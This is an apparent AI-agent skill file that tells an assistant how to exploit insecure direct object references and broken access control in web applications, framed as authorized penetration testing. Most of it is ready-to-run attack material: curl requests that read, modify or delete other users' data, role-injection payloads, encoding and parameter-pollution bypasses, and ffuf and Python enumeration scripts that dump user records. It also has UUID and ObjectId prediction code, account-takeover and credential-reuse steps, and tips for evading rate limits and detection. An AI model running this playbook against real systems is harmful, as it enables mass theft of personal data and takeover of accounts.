---
name: idor
description: >
  Exploit Insecure Direct Object Reference (IDOR) and broken access control
  vulnerabilities during authorized penetration testing.
keywords:
  - idor
  - idor enumeration
  - idor-enumeration
  - insecure direct object reference
  - broken access control
  - horizontal privilege escalation
  - vertical privilege escalation
  - parameter tampering
  - uuid enumeration
  - api idor
  - object reference
  - access control bypass
  - bola
  - broken object level authorization
  - user id enumeration
  - enumerate users via idor
tools:
  - burpsuite (Autorize/AuthMatrix extensions)
  - ffuf
  - curl
opsec: low
---

# IDOR / Broken Access Control

You are helping a penetration tester exploit Insecure Direct Object Reference
and broken access control vulnerabilities. The target application uses
user-controllable identifiers (IDs, UUIDs, filenames, etc.) to reference
objects without properly verifying the requesting user's authorization. The
goal is to access, modify, or delete objects belonging to other users, or
escalate privileges. All testing is under explicit written authorization.

## Engagement Logging

Check for `./engagement/` directory. If absent, proceed without logging.

When an engagement directory exists:
- Print `[idor] Activated → <target>` to the screen on activation.
- **Evidence** → save significant output to `engagement/evidence/` with
  descriptive filenames (e.g., `sqli-users-dump.txt`, `ssrf-aws-creds.json`).

## State Management

Call `get_state_summary()` from the state-reader MCP server to read current
engagement state. Use it to:
- Skip re-testing targets, parameters, or vulns already confirmed
- Leverage existing credentials or access for this technique
- Understand what's been tried and failed (check Blocked section)

Your return summary must include:
- New targets/hosts discovered (with ports and services)
- New credentials or tokens found
- Access gained or changed (user, privilege level, method)
- Vulnerabilities confirmed (with status and severity)
- Pivot paths identified (what leads where)
- Blocked items (what failed and why, whether retryable)

## Prerequisites

- Authenticated session (at least one valid low-privilege account)
- A second account at the same privilege level (for horizontal testing) or
  knowledge of a higher-privilege user's ID (for vertical testing)
- Proxy configured (Burp Suite with Autorize or AuthMatrix recommended)
- Target endpoint that references objects by ID in URL path, query parameter,
  POST body, or header

## Step 1: Assess

If not already provided, determine:

1. **ID format** — what type of identifier is used?

| Format | Example | Predictability |
|--------|---------|---------------|
| Sequential integer | `123`, `456` | Trivially enumerable |
| UUID v1 | `95f6e264-bb00-11ec-8833-00155d01ef00` | Timestamp + machine — partially predictable |
| UUID v4 | `550e8400-e29b-41d4-a716-446655440000` | Random — not enumerable without leak |
| MongoDB ObjectId | `5ae9b90a2c144b9def01ec37` | Timestamp + counter — predictable if you know creation time |
| Base64-encoded | `MTIz` (decodes to `123`) | Decode first, then assess inner format |
| Hash (MD5/SHA1) | `098f6bcd4621d373cade4e832627b4f6` | Predictable if input is known (e.g., MD5 of username) |
| Slug | `john-doe`, `my-post-title` | Guessable with wordlists |

2. **Injection point** — where does the ID appear?
   - URL path: `/api/users/123/profile`
   - Query parameter: `/api/profile?user_id=123`
   - POST/PUT body: `{"user_id": 123}`
   - Header: `X-User-Id: 123`
   - Cookie: `user=123`

3. **Authorization mechanism** — session cookie, JWT, OAuth token, API key?

4. **API type** — REST, GraphQL, gRPC-Web, SOAP?

## Step 2: Horizontal Access Control Testing

Test whether User A can access User B's objects (same privilege level).

### Basic Parameter Tampering

```bash
# Get your own resource (baseline — note response structure)
curl -s -H "Cookie: session=YOUR_SESSION" \
  "https://TARGET/api/users/YOUR_ID/profile"

# Try another user's ID (change ONLY the ID, keep your auth)
curl -s -H "Cookie: session=YOUR_SESSION" \
  "https://TARGET/api/users/OTHER_ID/profile"
```

Compare responses:
- **200 with other user's data** → confirmed IDOR
- **200 with your own data** → server ignores the ID parameter (uses session)
- **403/401** → access control is enforced
- **404** → ID doesn't exist or is hidden

### Sequential ID Enumeration

```bash
# Test IDs around your own
# If your ID is 1337, try 1336, 1338, 1, 2, etc.
for id in 1336 1338 1 2 100 1000; do
  echo -n "ID $id: "
  curl -s -o /dev/null -w "%{http_code}" \
    -H "Cookie: session=YOUR_SESSION" \
    "https://TARGET/api/users/$id/profile"
  echo
done
```

### Test All HTTP Methods

```bash
# The GET might be protected but PUT/DELETE might not be
for method in GET POST PUT PATCH DELETE; do
  echo -n "$method: "
  curl -s -o /dev/null -w "%{http_code}" -X $method \
    -H "Cookie: session=YOUR_SESSION" \
    "https://TARGET/api/users/OTHER_ID/profile"
  echo
done
```

### State-Changing IDOR (Write Operations)

```bash
# Try modifying another user's data
curl -s -X PUT -H "Cookie: session=YOUR_SESSION" \
  -H "Content-Type: application/json" \
  -d '{"email": "attacker@evil.com"}' \
  "https://TARGET/api/users/OTHER_ID/profile"

# Try deleting another user's resource
curl -s -X DELETE -H "Cookie: session=YOUR_SESSION" \
  "https://TARGET/api/users/OTHER_ID/documents/456"
```

## Step 3: Vertical Access Control Testing

Test whether a low-privilege user can access admin or higher-privilege
functionality.

### Role/Permission Field Injection

```bash
# If the API returns a role field, try including it in an update request
curl -s -X PUT -H "Cookie: session=LOW_PRIV_SESSION" \
  -H "Content-Type: application/json" \
  -d '{"role": "admin"}' \
  "https://TARGET/api/users/YOUR_ID/profile"

# Variants
-d '{"is_admin": true}'
-d '{"role_id": 1}'
-d '{"permissions": ["admin", "write", "delete"]}'
-d '{"group": "administrators"}'
```

### Admin Endpoint Access

```bash
# Try accessing admin endpoints with a regular user session
curl -s -H "Cookie: session=LOW_PRIV_SESSION" \
  "https://TARGET/api/admin/users"
curl -s -H "Cookie: session=LOW_PRIV_SESSION" \
  "https://TARGET/api/admin/dashboard"
curl -s -H "Cookie: session=LOW_PRIV_SESSION" \
  "https://TARGET/api/internal/config"

# Try alternate API versions (often less secure)
curl -s -H "Cookie: session=LOW_PRIV_SESSION" \
  "https://TARGET/api/v1/admin/users"
curl -s -H "Cookie: session=LOW_PRIV_SESSION" \
  "https://TARGET/api/mobile/admin/users"
```

### Function-Level Access Control

```bash
# Actions restricted in UI but not in API
# Export all users (admin function)
curl -s -H "Cookie: session=LOW_PRIV_SESSION" \
  "https://TARGET/api/users/export?format=csv"

# Approve/reject actions
curl -s -X POST -H "Cookie: session=LOW_PRIV_SESSION" \
  -H "Content-Type: application/json" \
  -d '{"status": "approved"}' \
  "https://TARGET/api/requests/789/approve"
```

## Step 4: API-Specific Patterns

### GraphQL IDOR

```graphql
# Query another user's data by ID
query {
  user(id: "OTHER_ID") {
    name
    email
    phone
    ssn
  }
}

# Use aliases to enumerate multiple IDs in one request (bypasses rate limiting)
query {
  u1: user(id: "1") { email }
  u2: user(id: "2") { email }
  u3: user(id: "3") { email }
  u4: user(id: "4") { email }
  u5: user(id: "5") { email }
}

# Discover queryable types via introspection
query {
  __schema {
    queryType {
      fields {
        name
        args { name type { name kind } }
      }
    }
  }
}
```

### Batch/Bulk Endpoints

Batch endpoints often bypass per-object authorization checks:

```bash
# Single request for multiple objects
curl -s -X POST -H "Cookie: session=YOUR_SESSION" \
  -H "Content-Type: application/json" \
  -d '[
    {"method": "GET", "path": "/api/users/1"},
    {"method": "GET", "path": "/api/users/2"},
    {"method": "GET", "path": "/api/users/3"}
  ]' \
  "https://TARGET/api/batch"

# Bulk export (if it exists)
curl -s -H "Cookie: session=YOUR_SESSION" \
  "https://TARGET/api/users?ids=1,2,3,4,5"
```

### File/Document Download IDOR

```bash
# Direct file reference
curl -s -H "Cookie: session=YOUR_SESSION" \
  "https://TARGET/download?file_id=OTHER_FILE_ID"

# Path-based file reference
curl -s -H "Cookie: session=YOUR_SESSION" \
  "https://TARGET/files/OTHER_USER/document.pdf"

# Signed URL with weak signature
curl -s "https://TARGET/files/document.pdf?token=WEAK_TOKEN&user=OTHER_ID"
```

## Step 5: Bypass Techniques

When basic parameter tampering fails, try these bypasses.

### Encoding Variations

```bash
# Base64-encoded ID
echo -n "OTHER_ID" | base64
# Use the encoded value: /api/users/T1RIRVJfSUQ=

# URL encoding
/api/users/%31%32%33  # URL-encoded "123"

# Double URL encoding
/api/users/%2531%2532%2533

# Unicode normalization (email-based IDs)
# victim@gmail.com -> v%C3%ADctim@gmail.com (may normalize to same)

# Hex encoding
/api/users/0x7b  # hex for 123

# Padded values
/api/users/00123
/api/users/123.0
/api/users/123%00
```

### Wrapped Object / Array Injection

```bash
# Original: {"id": 123}
# Try array:
{"id": [123]}

# Try string instead of int:
{"id": "123"}

# Try nested object:
{"id": {"$eq": 123}}

# Try XML if JSON fails:
curl -s -X POST -H "Content-Type: application/xml" \
  -d '<request><id>OTHER_ID</id></request>' \
  "https://TARGET/api/resource"
```

### Parameter Pollution

```bash
# Duplicate parameter (framework-dependent — some take first, some take last)
/api/resource?user_id=YOUR_ID&user_id=OTHER_ID

# Parameter in URL + body
GET /api/resource?user_id=YOUR_ID
POST body: user_id=OTHER_ID

# Parameter in different formats
/api/resource?user_id=YOUR_ID&user_id[]=OTHER_ID
```

### Method Override

```bash
# X-HTTP-Method-Override
curl -s -X POST -H "X-HTTP-Method-Override: PUT" \
  -H "Cookie: session=YOUR_SESSION" \
  -d '{"role": "admin"}' \
  "https://TARGET/api/users/YOUR_ID"

# Other override headers
-H "X-Method-Override: DELETE"
-H "X-Original-Method: PATCH"
```

### Wildcard / Mass Access

```bash
# Some APIs accept wildcards
curl -s -H "Cookie: session=YOUR_SESSION" \
  "https://TARGET/api/users/*/profile"
curl -s "https://TARGET/api/users?id=*"
curl -s "https://TARGET/api/files?name=*.pdf"
```

## Step 6: Automated Enumeration

Once IDOR is confirmed, automate data extraction.

### ffuf for Sequential IDs

```bash
# Enumerate user profiles (sequential integer IDs)
ffuf -u "https://TARGET/api/users/FUZZ/profile" \
  -H "Cookie: session=YOUR_SESSION" \
  -w <(seq 1 10000) \
  -mc 200 \
  -o idor-enum.json

# Filter by response size to remove empty/error responses
ffuf -u "https://TARGET/api/users/FUZZ/profile" \
  -H "Cookie: session=YOUR_SESSION" \
  -w <(seq 1 10000) \
  -mc 200 -fs 0 \
  -rate 50
```

### Python Extraction Script

```python
import requests
import json
import time

url = "https://TARGET/api/users/{}/profile"
cookies = {"session": "YOUR_SESSION"}
results = []

for uid in range(1, 10001):
    r = requests.get(url.format(uid), cookies=cookies)
    if r.status_code == 200:
        data = r.json()
        results.append(data)
        print(f"[+] ID {uid}: {data.get('email', 'no email')}")
    time.sleep(0.1)  # rate limiting

with open("idor-dump.json", "w") as f:
    json.dump(results, f, indent=2)
print(f"[*] Extracted {len(results)} records")
```

### UUID v1 Prediction

If UUIDs are v1 (timestamp-based), predict nearby IDs:

```python
import uuid
from datetime import datetime, timedelta

# Known UUID v1
known = uuid.UUID("95f6e264-bb00-11ec-8833-00155d01ef00")

# Extract timestamp and node
ts = known.time  # 100-nanosecond intervals since Oct 15, 1582
node = known.node
clock_seq = known.clock_seq

# Generate UUIDs for nearby timestamps (±1 hour in 1-second increments)
for delta in range(-3600, 3601):
    new_time = ts + (delta * 10_000_000)  # convert seconds to 100ns intervals
    candidate = uuid.UUID(fields=(
        new_time & 0xFFFFFFFF,           # time_low
        (new_time >> 32) & 0xFFFF,       # time_mid
        (new_time >> 48) & 0x0FFF | 0x1000,  # time_hi_version (v1)
        clock_seq >> 8,
        clock_seq & 0xFF,
        node
    ))
    print(candidate)
```

### MongoDB ObjectId Prediction

```python
import struct
import time

# Known ObjectId: 5ae9b90a2c144b9def01ec37
known_hex = "5ae9b90a2c144b9def01ec37"
ts = int(known_hex[:8], 16)          # first 4 bytes = unix timestamp
machine_pid = known_hex[8:18]         # next 5 bytes = machine + PID
counter = int(known_hex[18:], 16)     # last 3 bytes = counter

# Generate nearby ObjectIds (same second, increment counter)
for i in range(-100, 101):
    new_counter = (counter + i) & 0xFFFFFF
    candidate = f"{ts:08x}{machine_pid}{new_counter:06x}"
    print(candidate)
```

## Step 7: Escalate or Pivot

After confirming IDOR:

- **User data accessed (PII, emails, tokens)**: Assess scope — enumerate full
  range to determine total records exposed. If tokens or session IDs found,
  route to **oauth-attacks** or attempt session hijacking.
- **Credentials or API keys found**: Try credential reuse across services.
  Report in your return summary: new credentials.
- **Write IDOR confirmed (can modify other users)**: Test account takeover —
  change email, reset password, modify roles. Escalate if
  state-changing requests lack anti-CSRF tokens.
- **CORS misconfiguration found on same endpoint**: Route to
  **cors-misconfiguration** — CORS + IDOR = cross-origin mass data exfiltration.
- **File download IDOR**: Check for sensitive files (backups, configs, keys).
  Escalate if path traversal is possible in the file parameter.
- **Admin access achieved**: Route to privilege escalation skills or explore
  admin functionality for further vulnerabilities.

Report in your return summary: any new credentials, access, vulns, or pivot
paths discovered.

When routing, pass along: confirmed IDOR endpoint, ID format, working bypass
technique, and scope of exposed data.

## OPSEC Notes

- Basic IDOR testing (changing one ID) is indistinguishable from normal browsing
- High-volume enumeration (scanning ID ranges) generates many requests — use
  rate limiting (`-rate 50` in ffuf, `time.sleep()` in scripts)
- GraphQL alias batching sends many queries in one request — less visible in
  access logs but may trigger WAF rules on response size
- Write operations (PUT/DELETE to other users' resources) may trigger alerts —
  test on non-production accounts first if possible
- Autorize/AuthMatrix Burp extensions passively test IDOR as you browse —
  lowest OPSEC impact

## Troubleshooting

### All Requests Return Your Own Data

The server uses the session/token to determine the user, ignoring the ID
parameter entirely. This is actually secure design. Try:
- Testing on a different endpoint that does use the ID
- Checking if the ID is used in a different parameter name
- Looking for batch/export endpoints that may handle IDs differently

### 403 on Every Tampered Request

Access control is enforced per-object. Try:
- Different HTTP methods (GET blocked, but PUT might work)
- Method override headers (`X-HTTP-Method-Override`)
- Different API versions (`/v1/` vs `/v2/` vs `/mobile/`)
- Different Content-Type (JSON vs XML vs form-encoded)
- Parameter pollution (duplicate the ID parameter)
- Encoding variations (base64, URL encoding, hex)

### UUIDs Are Random (v4) and Can't Be Enumerated

- Check for UUID leakage in other responses, error messages, or public pages
- Check client-side JavaScript for hardcoded or leaked UUIDs
- Check browser localStorage/sessionStorage for cached IDs
- Look for endpoints that list or search objects (may return UUIDs)
- Try the `null` UUID: `00000000-0000-0000-0000-000000000000`

### Rate Limiting Blocks Enumeration

- Use GraphQL aliases to batch many IDs per request
- Slow down requests (`-rate 10` in ffuf)
- Rotate source IPs if authorized (multiple VPN endpoints)
- Check if rate limiting is per-IP, per-session, or per-endpoint
- Try batch/bulk API endpoints that accept multiple IDs

### Can Access Data but Can't Prove Impact

- Focus on PII (names, emails, phone numbers, addresses)
- Look for financial data (invoices, payment info, order history)
- Check for authentication tokens that enable account takeover
- Calculate total records exposed (scan the full ID range)
- Document the business impact (regulatory, reputational, financial)
